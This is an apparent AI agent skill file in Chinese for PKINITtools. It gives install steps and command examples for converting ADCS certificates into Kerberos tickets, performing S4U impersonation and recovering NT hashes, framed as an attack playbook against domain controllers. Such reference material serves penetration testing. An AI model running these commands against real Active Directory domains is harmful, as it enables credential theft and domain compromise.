---
name: pkinittools-adcs
description: 渗透工具 skill:PKINITtools 的安装、参数速查与攻击场景 playbook。当任务涉及 AD域渗透与域控攻击 需要调用 PKINITtools 时使用。
when-to-use: 渗透工具 skill:PKINITtools 的安装、参数速查与攻击场景 playbook。当任务涉及 AD域渗透与域控攻击 需要调用 PKINITtools 时使用。
---

# PKINITtools

- 攻击大类:C30 AD域渗透与域控攻击
- 上游仓库:https://github.com/dirkjanm/PKINITtools
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/dirkjanm/PKINITtools && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 gettgtpkinit.py -cert-pfx user.pfx corp.local/user user.ccache` | PFX 换票据 |
| `python3 gets4uticket.py -ccache user.ccache corp.local/user cifs/dc01` | S4U |
| `python3 getnthash.py -key 0x... corp.local/user` | NT 哈希恢复 |

## 攻击场景 Playbook

### ADCS PFX 武器化

```bash
python3 gettgtpkinit.py -cert-pfx user.pfx corp.local/user out.ccache
# certipy pfx→ccache→NT hash,dirkjanm 出品
```

## 注意事项

dirkjanm 出品,ADCS 证书+PKINIT 攻击链工具。
